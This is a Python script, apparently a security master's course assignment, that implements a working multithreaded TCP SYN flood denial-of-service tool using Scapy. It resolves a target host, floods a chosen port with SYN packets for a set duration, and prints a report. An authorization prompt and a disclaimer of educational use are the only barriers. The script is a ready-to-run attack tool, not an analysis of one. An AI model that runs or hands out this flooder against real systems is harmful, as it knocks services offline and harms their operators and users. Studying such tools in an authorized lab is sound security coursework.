#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Master's in Computer Security Engineering
Dynamic Programming Languages - SYN Flooder

Author: Martinho Caeiro (23917)

Description:
    Sends TCP SYN packets to simulate a denial-of-service attack (SYN Flood/DoS).
    Uses Scapy for low-level packet crafting.

Usage:
    python3 syn_flooder.py <target> <duration> [--port PORT]

Example:
    python3 syn_flooder.py 192.168.1.1 10 --port 80
"""

import socket
import sys
import argparse
import time
import threading
from datetime import datetime

def _ensure_package_local(package_name, import_name=None, prompt=True):
    """Minimal local helper to prompt+install a pip package at runtime."""
    import importlib
    import subprocess
    import sys as _sys

    mod_name = import_name or package_name
    try:
        return importlib.import_module(mod_name)
    except Exception:
        pass

    if not prompt:
        return None

    try:
        ans = input(f"Dependência '{package_name}' em falta. Instalar agora? [s/N]: ").strip().lower()
    except Exception:
        return None

    if ans not in ("", "s", "sim", "y", "yes"):
        return None

    cmd = [_sys.executable, "-m", "pip", "install", package_name]
    print(f"A executar: {' '.join(cmd)}")
    try:
        res = subprocess.run(cmd)
    except Exception as e:
        print(f"Falha ao executar o pip: {e}")
        return None

    if res.returncode != 0:
        print(f"pip install terminou com o código {res.returncode}")
        return None

    try:
        return importlib.import_module(mod_name)
    except Exception as e:
        print(f"Instalado, mas falhou ao importar {mod_name}: {e}")
        return None


# Ensure Scapy is available
_ensure_package_local("scapy")

try:
    from scapy.all import IP, TCP, Raw, send, RandShort
except ImportError:
    print("Erro: Scapy não foi encontrada ou falhou a importação.")
    print("Instale com: pip install scapy")
    sys.exit(1)

# Suppress Scapy warnings
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
try:
    from scapy.conf import conf
    conf.verbose = False
except:
    pass

    
# Section: SYN Flooder functions

def syn_flood_worker(target, target_port, duration, packets_sent, lock):
    """Worker thread that sends TCP SYN packets to a target."""
    end_time = time.time() + duration
    count = 0

    try:
        # Build packet
        ip = IP(dst=target)
        tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
        raw = Raw(b"X" * 1024)  # 1KB payload
        packet = ip / tcp / raw

        while time.time() < end_time:
            try:
                send(packet, verbose=False)
                count += 1
                
                # Show progress every 1000 packets
                if count % 1000 == 0:
                    with lock:
                        print(f"  {count:,} pacotes SYN enviados para {target}:{target_port}")

            except Exception as e:
                print(f"  Erro ao enviar pacote: {e}")
                continue

    except KeyboardInterrupt:
        pass
    except PermissionError:
        print("  ERRO: Este script requer privilégios de root/administrator para enviar pacotes raw!")
        sys.exit(1)
    except Exception as e:
        print(f"  Erro: {e}")

    with lock:
        packets_sent.append(count)


def flood_target(target, target_port, duration, num_threads):
    """Send SYN flood with multiple threads."""
    print(f"\nIniciando SYN Flood (TCP)")
    print(f"   Alvo: {target}:{target_port}")
    print(f"   Duração: {duration} segundos")
    print(f"   Threads: {num_threads}")
    print(f"   Protocolo: TCP SYN (ligações half-open)")
    print(f"   Payload: 1KB por pacote")
    print("-" * 60)

    packets_sent = []
    threads = []
    lock = threading.Lock()
    t_start = time.time()

    try:
        # Create threads
        for i in range(num_threads):
            t = threading.Thread(
                target=syn_flood_worker,
                args=(target, target_port, duration, packets_sent, lock),
                daemon=True
            )
            t.start()
            threads.append(t)

        # Wait for threads
        for t in threads:
            t.join()

    except KeyboardInterrupt:
        print("\nFlood interrompido pelo utilizador.")
    except PermissionError:
        print("\nERRO: Privilégios insuficientes!")
        print("Este script requer privilégios de root para manipular pacotes raw.")
        sys.exit(1)

    duration_real = time.time() - t_start
    total_packets = sum(packets_sent)
    pps = total_packets / duration_real if duration_real > 0 else 0

    print("\n" + "=" * 60)
    print("RELATÓRIO - SYN FLOOD")
    print("=" * 60)
    print(f"Alvo: {target}:{target_port}")
    print(f"Total de pacotes SYN enviados: {total_packets:,}")
    print(f"Taxa de envio: {pps:,.0f} pps (pacotes por segundo)")
    print(f"Duração real: {duration_real:.2f}s")
    print(f"Threads utilizadas: {num_threads}")
    print("=" * 60)


def main():
    parser = argparse.ArgumentParser(
        description="SYN Flooder - Ataque de negação de serviço (DoS) via TCP SYN",
        epilog="Apenas para fins educacionais em ambientes autorizados. Requer root/administrator."
    )
    parser.add_argument("target", help="Alvo (IP ou hostname)")
    parser.add_argument("duration", type=int, help="Duração em segundos")
    parser.add_argument("--port", "-p", type=int, default=80, help="Porta TCP (default: 80/HTTP)")
    parser.add_argument("--threads", "-n", type=int, default=4, help="Número de threads (default: 4)")

    try:
        args = parser.parse_args()
    except SystemExit:
        sys.exit(1)

    # Validations
    if args.port < 1 or args.port > 65535:
        print(f"Porta deve estar entre 1 e 65535")
        sys.exit(1)

    if args.duration < 1:
        print(f"Duração deve ser pelo menos 1 segundo")
        sys.exit(1)

    if args.threads < 1:
        print(f"Número de threads deve ser pelo menos 1")
        sys.exit(1)

    # Resolve hostname if needed
    try:
        target_ip = socket.gethostbyname(args.target)
        print(f"Alvo resolvido: {args.target} -> {target_ip}")
    except socket.gaierror:
        print(f"Não foi possível resolver {args.target}")
        sys.exit(1)

    # Determine service name
    service_name = "desconhecido"
    try:
        service_name = socket.getservbyport(args.port)
    except OSError:
        pass

    # Safety confirmation
    print("=" * 60)
    print("AVISO - ATAQUE SYN FLOOD (TCP)")
    print("=" * 60)
    print(f"Está prestes a enviar um ataque DoS para: {args.target}:{args.port} ({service_name})")
    print(f"Duração: {args.duration}s | Threads: {args.threads}")
    print("\nAVISOS IMPORTANTES:")
    print("  1. Este script requer privilégios de root/administrator")
    print("  2. Um ataque SYN Flood pode danificar infraestruturas críticas")
    print("  3. O uso não autorizado é ILEGAL em muitas jurisdições")
    print("  4. Utilize apenas em ambientes de teste autorizados")
    print("-" * 60)

    confirm = input("\nConfirma que tem autorização? (s/N): ").strip().lower()
    if confirm != "s" and confirm != "yes":
        print("Operação cancelada.")
        sys.exit(0)

    # Executar flood
    try:
        flood_target(target_ip, args.port, args.duration, args.threads)
    except PermissionError:
        print("\nERRO: Privilégios insuficientes!")
        print("Este script requer privilégios de root para manipular pacotes raw.")
        sys.exit(1)


if __name__ == "__main__":
    main()
